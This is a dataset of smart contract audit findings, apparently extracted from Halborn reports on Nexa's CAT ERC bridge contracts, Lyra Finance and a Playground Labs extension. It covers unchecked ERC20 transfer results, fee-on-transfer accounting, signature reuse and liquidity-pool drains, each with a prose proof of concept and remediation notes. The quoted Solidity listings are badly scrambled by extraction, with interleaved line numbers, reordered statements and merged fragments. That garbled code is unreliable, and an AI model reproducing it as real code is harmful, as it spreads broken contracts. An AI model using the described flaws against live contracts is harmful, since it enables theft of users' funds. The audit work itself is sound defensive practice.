untrusted event Code Location: Listing 6 1 REDACTED CVSS Vector:  AV:N/AC:H/PR:H/UI:R/S:U/C:L/I:N/A:N 27 Risk Level: Likelihood - 1 Impact - 2 Recommendation: It is recommended to check if each event processed is trusted: Listing 7 1 REDACTED Remediation Plan: FUTURE RELEASE: The Playground Labs team intend to address this finding in a future release. 28 THANK YOU FOR CHOOSING", "labels": ["Halborn", "Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest", "Severity: Informational"]}, {"title": "UNSAFE HANDLING OF ERC20 TRANSFER RESULTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Nexa_CAT_ERC_Standards_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "It was identified that the bridgeOut function in the CATERC20Proxy con- tract does not verify the return value of the transferFrom function call, which facilitates the token transfer from the caller to the contract. Some tokens (e.g., ZRX) return false instead of reverting in the event of failure or insufficient balance. Setting up the contract with such tokens could enable users to transfer funds to other chains without transferring any tokens to the CATERC20Proxy contract. In these cases, by exploiting this vulnerability, a malicious user can extract the funds from the con- tract by depositing a huge amount with actual funds, then withdrawing it from the contract. It was also identified that the CATERC20Proxy contract indirectly uses the ERC20 interface for the transferFrom function calls, and expects the function to return a boolean value. However, the transferFrom function of some ERC-20 tokens (e.g., USDT, BNB) does not return any values. If the CATERC20Proxy contract is configured with such tokens, then the transferFrom calls reverts, preventing the users from depositing or with- drawing. Code Location: The SafeERC20 wrapper is not used for transferring tokens from the de- positor in the bridgeOut function of the CATERC20Proxy contract: Listing 1: contracts/ERC20/CATERC20Proxy.sol 63  contract 64  normalizedAmount ); // Transfer in contract and lock the tokens in this nativeAsset () . transferFrom ( _msgSender () , address ( this ) , 21 The transferFrom function of some tokens (e.g., ZRX) return false instead of reverting in the event of failure or insufficient balance: Listing 2: The implementation of the transferFrom function of the ZRX token if ( balances [ _from ] >= _value && allowed [ _from ][ msg . sender function transferFrom ( address _from , address _to , uint _value ) 74  returns ( bool ) { 75  ] >= _value && balances [ _to ] + _value >= balances [ _to ]) { 76 77 78 79 80 81 82 balances [ _to ] += _value ; balances [ _from ] -= _value ; allowed [ _from ][ msg . sender ] -= _value ; Transfer ( _from , _to , _value ); return true ; } else { return false ; } } The nativeAsset in the CATERC20Proxy contract uses the IERC20Extended interface: Listing 3: contracts/ERC20/Getters.sol 51 52 53 function nativeAsset () public view returns ( IERC20Extended ) { return IERC20Extended ( _state . nativeAsset ); } The IERC20Extended interface extends the IERC20 interface: Listing 4: contracts/interfaces/IERC20Extended.sol 6 interface IERC20Extended is IERC20 { 7 8 } function decimals () external view returns ( uint8 ); 22 The IERC20 interface excepts a return value from the transferFrom func- tion: Listing 5: @openzeppelin/contracts/token/ERC20/IERC20.sol 77 78 79 80 81 function transferFrom ( address from , address to , uint256 amount ) external returns ( bool ); However, the transferFrom function of some tokens (e.g., USDT) does not return any value, which would cause the contract to revert: Listing 6: The ERC20 Interface Used By USDT function allowance ( address owner , address spender ) public function transferFrom ( address from , address to , uint value ) function approve ( address spender , uint value ) public ; event Approval ( address indexed owner , address indexed spender , 77 contract ERC20 is ERC20Basic { 78  constant returns ( uint ); 79  public ; 80 81  uint value ); 82 } Proof of Concept: 1. A CATERC20Proxy is deployed on the Mainnet, configured with the ZRX token. 2. A malicious user exploits the lack of SafeERC20 wrapper and deposits tokens to the bridge without actually depositing any funds. 3. The deposit is successful and the LogMessagePublished event is emit- ted because the ZRX token returns false instead of reverting, and the CATERC20Proxy contracts do not check the return value. 4. The malicious user then withdraws their token balance from the CATERC20Proxy contract. 5. The deficit of funds prevents other users from withdrawing their ZRX tokens from the CATERC20Proxy contract. 23 The following example is a demonstration of a successful ZRX deposit with alice, who holds zero ZRX tokens: 1. A CATERC20Proxy is deployed on the Mainnet, configured with the USDT token. 2. The users try to deposit. However, they cannot deposit because the BridgeOut function reverts every time they call it. 24 The following example demonstrates the revert of the BridgeOut function when the contract was configured with the USDT token: BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:H/D:H/Y:N/R:N/S:U (9.4) Recommendation: It is recommended to use OpenZeppelins SafeERC20 wrapper and the safeTransferFrom function to transfer the payment tokens from the callers to the contract. 25 Remediation Plan: SOLVED: The Nexa team solved the issue in commit 912abf2 by using the OpenZeppelins SafeERC20 wrapper and the safeTransferFrom function to transfer the payment tokens from the callers to the contract. 26 ", "labels": ["Halborn", "Nexa_CAT_ERC_Standards", "Severity: Critical"]}, {"title": "INCOMPATIBILITY WITH TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Nexa_CAT_ERC_Standards_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "It was identified that the bridgeOut function in the CATERC20Proxy con- tract assumes that the transferFrom call transfers the full amount of tokens. This may not be true if the tokens being transferred are transfer- on-fee tokens, causing the received amount to be lesser than the accounted amount, resulting in an increasing deficit of funds in the CATERC20Proxy contract. If the contract does not have the full token amounts, the fol- lowing bridgeIn function calls may revert because of insufficient funds, preventing users from withdrawing their full balances. The CATERC20Proxy contract also assumes that its native asset token balances does not change over time without any token transfers, which not be true if the native asset is deflationary/inflationary/rebasing tokens. For example, the supply of AMPL (Ampleforth) tokens automatically increases or decreases every 24 hours to maintain the AMPL target price. In these cases, the contract might not have the full token amounts and the following bridgeIn function calls may revert because of insufficient funds. Code Location: Listing 7: contracts/ERC20/CATERC20Proxy.sol (Lines 64,67) // Transfer in contract and lock the tokens in this nativeAsset () . transferFrom ( _msgSender () , address ( this ) , 63  contract 64  normalizedAmount ); 65 66  CATERC20Structs . CrossChainPayload ({ 67 68 amount : normalizedAmount , tokenAddress : tokenAddress , CATERC20Structs . CrossChainPayload memory transfer = 27 69 70 71 72 tokenChain : tokenChain , toAddress : recipient , toChain : recipientChain }) ; Proof of Concept: Using a transfer-on-fee token: 1. A CATERC20Proxy is deployed on the Mainnet configured with a transfer-on-fee token. 2. The CATERC20Proxy contract is incorrectly accounting for the de- posits. 3. The users withdraw more funds than their actual deposit, resulting in an increasing deficit of funds in the CATERC20Proxy contract. 4. The deficit of funds prevents other users from withdrawing their tokens from the CATERC20Proxy contract. Using a deflationary token: 1. A CATERC20Proxy is deployed on the Mainnet configured with a defla- tionary token. 2. The CATERC20Proxy contract is incorrectly accounting for the deposits as the token balance of the contract decreases over time. 3. The users withdraw their original deposit amount, resulting in an increasing deficit of funds in the CATERC20Proxy contract. 4. The deficit of funds prevents other users from withdrawing their tokens from the CATERC20Proxy contract. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:M/Y:N/R:N/S:U (5.0) 28 Recommendation: It is recommended to get the exact received amount of the tokens being transferred by calculating the difference of the token balance before and after the transfer to handle transfer-on-fee tokens. It is recommended to state in the documentation that the contracts are incompatible with deflationary/inflationary/rebasing tokens. Remediation Plan: SOLVED: The Nexa team solved the issue in commits 970a9d6, 12163c3 and A comment with a 23e9f7e by calculating the exact received amounts. disclaimer was added in the CATERC20Proxy contract to warn users about the incompatibility with deflationary or inflationary tokens. 29 ", "labels": ["Halborn", "Nexa_CAT_ERC_Standards", "Severity: Low"]}, {"title": "RECIPIENT CHAIN ID IS NOT VALIDATED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Nexa_CAT_ERC_Standards_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "Users can bridge tokens to different chains using the BridgeOut functions of the CATERC20, CATERC20Proxy, CATERC721 and CATERC721Proxy contracts. However, it was identified that these functions do not validate the recipient recipientChain parameter, containing the recipient chain ID. This presents a risk, as users may inadvertently send tokens to chains where the requisite bridge contracts are absent (e.g., the users confuse the Wormhole chain ID with the network chain ID). In such instances, the users would not be able to withdraw, and their tokens would remain locked in the contract until the requisite bridge contracts are not deployed. Code Location: The recipientChain parameters are not validated in the bridgeOut func- tions. For example, in the CATERC20 contract: Listing 8: contracts/ERC20/CATERC20.sol function bridgeOut ( uint256 amount , uint16 recipientChain , bytes32 recipient , uint32 nonce 52 53 54 55 56 57 58 59 60 61  publish message \"); ) external payable returns ( uint64 sequence ) { require ( isInitialized () == true , \" Not Initialized \"); uint256 fee = wormhole () . messageFee () ; require ( msg . value >= fee , \" Not enough fee provided to Note that an allowlist was implemented for the bridgeIn function. 30 Listing 9: contracts/ERC20/CATERC20.sol (Line 102) 100 101 102 require ( bytesToAddress ( vm . emitterAddress ) == address ( this ) || tokenContracts ( vm . emitterChainId ) == vm .  emitterAddress , 103 104 ); \" Invalid Emitter \" BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:C/Y:N/R:F/S:U (2.5) Recommendation: It is recommended to create an allowlist and use it inside the bridgeOut function to only allow token transfers to supported chains. Remediation Plan: SOLVED: The Nexa team solved the issue in commit 252f468 by allowing token transfers to supported chains only. 31 ", "labels": ["Halborn", "Nexa_CAT_ERC_Standards", "Severity: Low"]}, {"title": "LACK OF CHAIN FORK VERIFICATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Nexa_CAT_ERC_Standards_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "It was identified that the bridgeIn and bridgeOut functions of the CATERC20 , CATERC20Proxy, CATERC721 and CATERC721Proxy contracts do not check whether the current blockchain is a fork or not. Executing the bridgeIn or the bridgeOut functions on a forked chain may result in the users receiving the transferred tokens both from the original and on the forked chains. Code Location: For example, in the CATERC20 contract, the bridgeIn function does not check whether the current blockchain is a fork or not: Listing 10: contracts/ERC20/CATERC20.sol function bridgeIn ( bytes memory encodedVm ) external returns ( require ( isInitialized () == true , \" Not Initialized \"); ( IWormhole . VM memory vm , bool valid , string memory reason ) 93  bytes memory ) { 94 95 96  = wormhole () . parseAndVerifyVM ( 97 98 99 100 101 102 ); require ( valid , reason ); require ( encodedVm bytesToAddress ( vm . emitterAddress ) == address ( this ) || tokenContracts ( vm . emitterChainId ) == vm .  emitterAddress , 103 104 105 106 \" Invalid Emitter \" ); CATERC20Structs . CrossChainPayload memory transfer =  decodeTransfer ( vm . payload ); 107 address transferRecipient = bytesToAddress ( transfer .  toAddress ); 108 32 109 require (! isTransferCompleted ( vm . hash ) , \" transfer already  completed \"); 110 111 112 setTransferCompleted ( vm . hash ); require ( transfer . toChain == wormhole () . chainId () , \" invalid  target chain \" ); BVSS: AO:A/AC:L/AX:H/C:N/I:N/A:N/D:H/Y:N/R:N/S:U (2.5) Recommendation: It is recommended to save the chain ID in the contract and verify in the bridgIn function that its value matches with block.chainid. Remediation Plan: SOLVED: The Nexa team solved the issue in commit ad7853f by checking the chain ID. 33 ", "labels": ["Halborn", "Nexa_CAT_ERC_Standards", "Severity: Low"]}, {"title": "TRANSFER AMOUNTS ARE NOT NORMALIZED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Nexa_CAT_ERC_Standards_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "It was identified that the bridgeOut and bridgeIn functions of the CATERC20 and CATERC20Proxy contracts do not normalize and denormalize the transfer Since transfer amounts are not amounts of the cross-chain messages. normalized and denormalized, the users lose funds if the bridges sending and receiving tokens use different decimals. Note that on some blockchains, tokens are limited to have a maximum of 8 decimal places, which may require the transfer amounts to be normalized. However, the current implementations of the contracts are intended to be only used on EVM compatible chains. Code Location: Instead of calculating the normalizedAmount in the bridgeOut function, the transfer amount is rounded by first normalizing and then denormalizing it. This operation is used in other contracts to avoid any loss of deposited funds due to the decimal shift, and the actual normalization is missing from the function. For example, in the CATERC20 contract: Listing 11: contracts/ERC20/CATERC20.sol uint256 normalizedAmount = deNormalizeAmount ( normalizeAmount ( amount , decimals () ) , decimals () ); _burn ( _msgSender () , normalizedAmount ); 64 65 66 67 68 69 70  CATERC20Structs . CrossChainPayload ({ 71 72 73 74 amount : normalizedAmount , tokenAddress : tokenAddress , tokenChain : tokenChain , toAddress : recipient , CATERC20Structs . CrossChainPayload memory transfer = 34 75 76 }) ; toChain : recipientChain The same issue can be identified in the nativeAmount calculation of the bridgeIn functions. For example, in the CATERC20 contract: Listing 12: contracts/ERC20/CATERC20.sol uint256 nativeAmount = deNormalizeAmount ( normalizeAmount ( transfer . amount , decimals () ) , decimals () ); _mint ( transferRecipient , nativeAmount ); 114 115 116 117 118 119 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:L/Y:N/R:N/S:U (2.5) Recommendation: It is recommended to examine whether there is a need to normalize the token transfer amounts. If normalization is not necessary, it is recommended to remove the unnecessary code from the bridgeOut functions. Remediation Plan: SOLVED: The Nexa team solved the issue in commits 0cbbb8c and 4e08af4 by normalizing the transfer amounts. 35 ", "labels": ["Halborn", "Nexa_CAT_ERC_Standards", "Severity: Low"]}, {"title": "SIGNATURES CAN BE REUSED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Nexa_CAT_ERC_Standards_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the CATERC20Governance and CATERC721Governance contracts, custo- dians authorized by signatures can also execute the registerChain, registerChains and updateFinality functions. The signature can only be used by the specified custodian until its validity period. However, it was identified that signatures can be reused arbitrarily times until they are not expired. It is also impossible to revoke the validity of the signatures. If the custodian accounts get compromised, the attacker can execute the registerChain, registerChains and updateFinality functions until the signature is not expired. Code Location: The onlyOwnerOrOwnerSignature modifier does not check whether the sig- nature has been used or revoked. For example, in the CATERC20Governance contract: Listing 13: contracts/ERC20/Governance.sol (Lines 68-73) modifier onlyOwnerOrOwnerSignature ( CATERC20Structs . SignatureVerification memory if ( _msgSender () == owner () ) { _; ) { } else { 36 37  signatureArguments 38 39 40 41 42 43 44  signatureArguments . validTill ) 45 46 47  \" custodian can call only \" ); keccak256 ( ) bytes32 encodedHashData = prefixed ( abi . encodePacked ( signatureArguments . custodian , ); require ( signatureArguments . custodian == _msgSender () , 36 require ( signatureArguments . validTill > block . timestamp verifySignature ( encodedHashData , require ( 48  , \" signed transaction expired \"); 49 50  signatureArguments . signature , owner () ) , 51 52 53 54 55 \" unauthorized signature \" ); _; } } BVSS: AO:A/AC:L/AX:L/C:N/I:L/A:N/D:N/Y:N/R:N/S:U (2.5) Recommendation: It is recommended to extend the onlyOwnerOrOwnerSignature modifier to also check if the signature has been used or revoked. Remediation Plan: PENDING: The Nexa team updated the code to prevent signature reuse in commit ebc0400. The Nexa team will implement the signature revoke feature in a future release. 37 ", "labels": ["Halborn", "Nexa_CAT_ERC_Standards", "Severity: Low"]}, {"title": "LACK OF EMERGENCY STOP PATTERN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Nexa_CAT_ERC_Standards_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The CATERC20, CATERC20Proxy, CATERC721 and CATERC721Proxy contracts do not implement any kind of emergency stop pattern. Such a pattern allows the project team to pause crucial functionalities while being in a state of emergency, e.g., being under an adversary attack. The most prevalent application of the emergency stop pattern is the Pausable contract from the OpenZeppelins library. If the emergency stop pattern is not used, functions such as bridgeOut, bridgeIn cannot be temporarily disabled. BVSS: AO:A/AC:L/AX:H/C:N/I:N/A:N/D:H/Y:N/R:N/S:U (2.5) Recommendation: It is recommended to use the emergency stop pattern in the contracts. Remediation Plan: RISK ACCEPTED: The Nexa team made a business decision to accept the risk of this finding. 38 ", "labels": ["Halborn", "Nexa_CAT_ERC_Standards", "Severity: Low"]}, {"title": "MISTAKENLY SENT TOKENS AND ETHER CANNOT BE RECOVERED FROM THE CONTRACTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Nexa_CAT_ERC_Standards_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "It was identified that the CATERC20, CATERC20Proxy, CATERC721 and sweep/recover missing CATERC721Proxy accidental token and Ether transfers. Mistakenly sent tokens and Ether are locked in the contracts indefinitely. contracts functions are to BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:L/Y:N/R:N/S:U (2.5) Recommendation: It is recommended to add a function to recover accidental token and Ether transfers. Remediation Plan: RISK ACCEPTED: The Nexa team made a business decision to accept the risk of this finding. 39 ", "labels": ["Halborn", "Nexa_CAT_ERC_Standards", "Severity: Low"]}, {"title": "OWNER CAN RENOUNCE OWNERSHIP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Nexa_CAT_ERC_Standards_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The owner of the contract is usually the account that deploys the con- tract. As a result, the owner can perform some privileged functions. In the CATERC20, CATERC20Proxy, CATERC721 and CATERC721Proxy contracts, the renounceOwnership function can be used to renounce the owner permis- sion. Renouncing ownership would result in the contract having no owner, eliminating the ability to call privileged functions. Code Location: The contracts are inherited from the Ownable contract, and therefore, their ownership can be renounced with the renounceOwnership function: Listing 14: openzeppelin-contracts/contracts/access/Ownable.sol function renounceOwnership () public virtual onlyOwner { _transferOwnership ( address (0) ) ; } 61 62 63 BVSS: AO:S/AC:L/AX:L/C:N/I:N/A:C/D:N/Y:N/R:N/S:U (2.0) Recommendation: It is recommended that the owner cannot call renounceOwnership without first transferring ownership to another address. In addition, if a multi- signature wallet is used, the call to the renounceOwnership function should be confirmed for two or more users. 40 Remediation Plan: RISK ACCEPTED: The Nexa team made a business decision to accept the risk of this finding. 41 4.10 (HAL-10) SINGLE STEP OWNERSHIP TRANSFER PROCESS - LOW (2.0) ", "labels": ["Halborn", "Nexa_CAT_ERC_Standards", "Severity: Informational"]}, {"title": "MISCALCULATION OF PENDING DELTA LIQUIDITY LEADS TO AN INCORRECT HEDGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lyra_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The _getLiquidity function in the LiquidityPool contract miscalculates the value of pendingDeltaLiquidity when pendingDelta > freeLiquidity. Consequently, in the aforementioned situation, the liquidity pool cannot be used for withdrawals nor use the available liquidity for delta hedging, as shown in the following comparison table: Scenario 2 shows that pendingDeltaLiquidity, the amount is used for delta hedging, could be up to 20 instead of just 5. This latter value is the incorrect amount proposed by Scenario 1. Code Location: Listing 1: LiquidityPool.sol (Line 863) 854 uint usedQuote = totalOutstandingSettlements + totalQueuedDeposits  + lockedCollateral . quote + pendingBaseValue ; 855 856 uint totalQuote = quoteAsset . balanceOf ( address ( this )) ; 857 858 liquidity . freeLiquidity = totalQuote > ( usedQuote + 13  reservedTokenValue ) ? totalQuote - ( usedQuote + reservedTokenValue ) : 0; 859 860 861 862 // ensure pendingDelta <= liquidity . freeLiquidity 863 liquidity . pendingDeltaLiquidity = liquidity . freeLiquidity >  pendingDelta ? pendingDelta : liquidity . freeLiquidity ; 864 liquidity . freeLiquidity -= liquidity . pendingDeltaLiquidity ; 865 866 liquidity . burnableLiquidity = totalQuote > ( usedQuote +  pendingDelta ) ? totalQuote - ( usedQuote + pendingDelta ) : 0; Risk Level: Likelihood - 5 Impact - 4 Recommendation: Update the pendingDeltaLiquidity calculation to take advantage of current balance in the liquidity pool for more accurate delta hedging. Remediation plan: SOLVED: The issue was fixed in commit d8d2e902c6d368313d9e04bec40c21fbf70b870b. 14 ", "labels": ["Halborn", "Lyra_Finance", "Severity: High"]}, {"title": "COLLATERAL CAN BE UPDATED IN SETTLED BOARDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lyra_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The _doTrade and addCollateral functions from OptionMarket contract allow updating collateral on positions, even if the board is settled. As a consequence, unexpected situations may happen:  The added collateral could be forever stuck in ShortCollateral con- tract and the liquidity pool would never get it.  If the result is not favorable for users once a board is settled, they can reduce their collateral and negatively affect the liquidity of the protocol.  Even in some edge scenarios of volatility, the collateral on posi- tions can be reduced to less than expected. Code Location: addCollateral function will update positions collateral without previ- ously verifying if board is settled: Listing 2: OptionMarket.sol (Line 511) 508 function addCollateral ( uint positionId , uint amountCollateral )  external nonReentrant notGlobalPaused { 509 510 int pendingCollateral = SafeCast . toInt256 ( amountCollateral ); OptionType optionType = optionToken . addCollateral ( positionId ,  amountCollateral ); _routeUserCollateral ( optionType , pendingCollateral ); 511 512 } 15 When opening / closing a position, if trade amount is 0, _doTrade function wont verify is board is settled and will return earlier, which allows updating positions collateral: Listing 3: OptionMarket.sol (Lines 728,732) 727 // don 't engage AMM if only collateral is added / removed 728 if ( trade . amount == 0) { 729 730 if ( expectedAmount != 0) { revert TradeIterationsHasRemainder ( address ( this ) , iterations ,  expectedAmount , 0, 0) ; } return (0 , 0, 0, new OptionMarketPricer . TradeResult [](0) ); 731 732 733 } 734 735 if ( board . frozen ) { 736 737 } 738 if ( board . expiry < block . timestamp ) { 739 revert BoardIsFrozen ( address ( this ) , board . id ); revert BoardExpired ( address ( this ) , board . id , board . expiry ,  block . timestamp ); Risk Level: Likelihood - 5 Impact - 4 Recommendation: Update the logic of addCollateral and _doTrade functions to revert if a board is settled. Remediation plan: SOLVED: The issue was fixed in the following commits:  056017961c89f0800eec2dfd5bc559a591b68aae  d8d2e902c6d368313d9e04bec40c21fbf70b870b 16 ", "labels": ["Halborn", "Lyra_Finance", "Severity: High"]}, {"title": "LIQUIDITY POOL COULD RUN OUT OF SUSD TOKENS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lyra_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When closing a position long call, the _maybeExchangeBase function is called with the argument revertBuyOnInsufficientFunds set to false. As a consequence, the liquidity pool will be able to swap sUSD for sETH without limits and could eventually run out of sUSD tokens. This situation could affect some relevant operations such as withdrawal, premium payment, settlement, etc. Proof of Concept: Initial liquidity info for the test: The attacker opens a long call position of 120 sETH. There is a big differ- ence between lockedCollateral.base and sETH balance because of (HAL-04) DIFFERENCES BETWEEN LOCKED COLLATERAL AND SETH BALANCE ARE NOT ADEQUATELY CAPPED: 17 Because of the difference, the owner decides to set maxFeePaid = MAX_UINT to enable sETH repurchase. On the other hand, a user withdraws sUSD from liquidity pool. The image shows liquidity info after withdrawal: Finally, the attacker closes the 82.6 sETH long call position: Since the swap is not limited by any parameter, the protocol uses all available sUSD. In the end, the new sUSD balance is almost 0 (0.29037... in the example): 18 Code Location: Listing 4: LiquidityPool.sol (Line 917) 913 ( uint quoteSpent , uint baseReceived ) = synthetixAdapter .  exchangeToExactBaseWithLimit ( exchangeParams , address ( optionMarket ) , amountBase , revertBuyOnInsufficientFunds ? freeLiquidity : type ( uint ). max 914 915 916 917 918 ); 919 emit BasePurchased ( quoteSpent , baseReceived ); Risk Level: Likelihood - 4 Impact - 4 Recommendation: It is recommended to only allow the use of freeLiquidity for swapping when closing a position. Another alternative could be to allow an amount greater than freeLiquidity but within a predefined threshold. 19 Remediation plan: SOLVED: The issue was fixed in commit d8d2e902c6d368313d9e04bec40c21fbf70b870b. With the update to the _getLiquidity function in the LiquidityPool contract, this attack vector is not feasible. 20 ", "labels": ["Halborn", "Lyra_Finance", "Severity: High"]}, {"title": "DIFFERENCES BETWEEN LOCKED COLLATERAL AND SETH BALANCE ARE NOT ADEQUATELY CAPPED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lyra_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The differences between lockedCollateral.base and sETH balance in the These liquidity pool are not limited to opening long call positions. differences could create distorted liquidity values with the following consequences:  In some scenarios, the liquidity pool can run out of sUSD, which could affect some operations such as withdrawals, payment of premiums, settlement, etc. See (HAL-03) LIQUIDITY POOL COULD RUN OUT OF SUSD TOKENS for more details.  Distorted liquidity values will erroneously affect protocol deci- more liquidity to withdraw, less amount to sions, for example: hedge, etc. See Proof of Concept below for more details. Proof of Concept: Initial situation for the test: Scenario 1: quoteBaseFeeRate <= maxFeePaid The user opens a long call position of 100 sETH. Due to the swap, sETH balance and lockedCollateral.base have the same value: 21 Scenario 2: quoteBaseFeeRate > maxFeePaid The user opens a long call position 100 sETH. Because there is no swap, differences between sETH balance and lockedCollateral.base will increase: Comparative table of liquidity info between both scenarios: 22 Scenario 2 shows that freeLiquidity and burnableLiquidity have increased, but pendingDeltaLiquidity has decreased. These distorted liquidity values (compared to Scenario 1) will erroneously affect protocol decisions, e.g: more liquidity to withdraw, less amount to hedge, etc. Code Location: lockBase function increases the value of lockedCollateral.base and then calls _maybeExchangeBase: Listing 5: LiquidityPool.sol (Lines 554,555) 549 function lockBase ( uint amount , 550 SynthetixAdapter . ExchangeParams memory exchangeParams , 551 552 uint freeLiquidity 553 ) external onlyOptionMarket { 554 555 556 557 } lockedCollateral . base += amount ; _maybeExchangeBase ( exchangeParams , freeLiquidity , true ); emit BaseLocked ( amount , lockedCollateral . base ); _maybeExchangeBase function could return earlier without swapping, which creates a big difference between lockedCollateral.base and sETH balance: Listing 6: LiquidityPool.sol (Lines 898,901,911) 898 } else if ( currentBaseBalance < lockedCollateral . base ) { 899 900 901 902 // Buy base for quote uint amountBase = lockedCollateral . base - currentBaseBalance ; if ( exchangeParams . quoteBaseFeeRate > lpParams . maxFeePaid ) { uint estimatedExchangeCost = synthetixAdapter .  estimateExchangeToExactBase ( exchangeParams , amountBase ); 903 if ( revertBuyOnInsufficientFunds && estimatedExchangeCost >  freeLiquidity ) { 904 905 906 907 revert InsufficientFreeLiquidityForBaseExchange ( address ( this ) , amountBase , estimatedExchangeCost , 23 908 909 910 911 912 freeLiquidity ); } return ; } Risk Level: Likelihood - 5 Impact - 3 Recommendation: It is recommended not to allow opening positions if the liquidity pool cannot get enough sETH, even after trying to swap. Another alternative could be to allow these transactions as long as the difference between sETH balance and lockedCollateral.base does not exceed a predefined threshold. Remediation plan: PARTIALLY SOLVED: Commit d8d2e902c6d368313d9e04bec40c21fbf70b870b par- tially fixes this security issue by not allowing the liquidity pool to run out of sUSD. 24 ", "labels": ["Halborn", "Lyra_Finance", "Severity: High"]}, {"title": "SKEW UPDATE COULD CREATE DATA INCONSISTENCIES WITH GWAV ORACLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lyra_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The _addNewStrikeToStrikeCache and _updateStrikeSkew functions of the OptionGreekCache contract update strikeSkewGWAV with the value of a new skew. If this new skew is outside the gwavSkewFloor / gwavSkewCap range, strikeSkewGWAV will store a capped skew (not the actual value), which feeds the GWAV oracle inconsistent data. Code Location: Listing 7: OptionGreekCache.sol (Lines 408,420) OptionBoardCache storage boardCache , uint strikeId , uint strikePrice , uint skew 404 function _addNewStrikeToStrikeCache ( 405 406 407 408 409 ) internal { 410 // This is only called when a new board or a new strike is added  , so exposure values will be 0 411 412 413 414 415 416 417 418 419 420 StrikeCache storage strikeCache = strikeCaches [ strikeId ]; strikeCache . id = strikeId ; strikeCache . strikePrice = strikePrice ; strikeCache . skew = skew ; strikeCache . boardId = boardCache . id ; emit StrikeCacheUpdated ( strikeCache ); strikeSkewGWAV [ strikeId ]. _initialize ( _max ( _min ( skew , greekCacheParams . gwavSkewCap ) ,  greekCacheParams . gwavSkewFloor ) , 421 422 ); block . timestamp 25 Listing 8: OptionGreekCache.sol (Lines 862,865) OptionBoardCache storage boardCache , StrikeCache storage strikeCache , uint newSkew 857 function _updateStrikeSkew ( 858 859 860 861 ) internal { 862 strikeCache . skew = newSkew ; 863 864 strikeSkewGWAV [ strikeCache . id ]. _write ( 865 _max ( _min ( newSkew , greekCacheParams . gwavSkewCap ) ,  greekCacheParams . gwavSkewFloor ) , block . timestamp 866 867 ); Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to revert transactions if the new value of skew is less than gwavSkewFloor or greater than gwavSkewCap. Remediation plan: RISK ACCEPTED: The Lyra team accepted the risk of this finding and stated that feeding the GWAV oracle with a capped skew value (different from the one cached) in edge cases is intentional behavior of the protocol. 26 ", "labels": ["Halborn", "Lyra_Finance", "Severity: Medium"]}, {"title": "WITHDRAWALS GET TEMPORARILY BLOCKED WHEN CREATING BOARDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lyra_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When the owner creates a new board, the addBoard function from triggers called. OptionGreekCache function _updateGlobalLastUpdatedAt, which sets the value of minUpdatedAtPrice to 0. contract This is As a consequence, users will not be able to withdraw from the liquid- ity pool (processWithdrawalQueue) because _canProcess will always return false until someone explicitly calls the updateBoardCachedGreeks function to update the cache with the actual values. Code Location: addBoard function triggers _updateGlobalLastUpdatedAt: Listing 9: OptionGreekCache.sol (Line 336) 323 boardCache . expiry = board . expiry ; 324 boardCache . iv = board . iv ; 325 boardCache . updatedAt = block . timestamp ; 326 emit BoardCacheUpdated ( boardCache ); 327 boardIVGWAV [ board . id ]. _initialize ( board . iv , block . timestamp ); 328 emit BoardIvUpdated ( boardCache . id , board .iv , globalCache .  maxIvVariance ); 329 330 liveBoards . push ( board . id ); 331 332 for ( uint i = 0; i < strikes . length ; i ++) { 333 _addNewStrikeToStrikeCache ( boardCache , strikes [ i ]. id , strikes [ i ].  strikePrice , strikes [i ]. skew ); 334 } 335 336 _updateGlobalLastUpdatedAt () ; 27 _updateGlobalLastUpdatedAt function sets minUpdatedAtPrice to 0: Listing 10: OptionGreekCache.sol (Lines 822,836) minUpdatedAt = boardCache . updatedAt ; maxUpdatedAtPrice = boardCache . updatedAtPrice ; minUpdatedAtPrice = boardCache . updatedAtPrice ; } if ( boardCache . updatedAtPrice > maxUpdatedAtPrice ) { } if 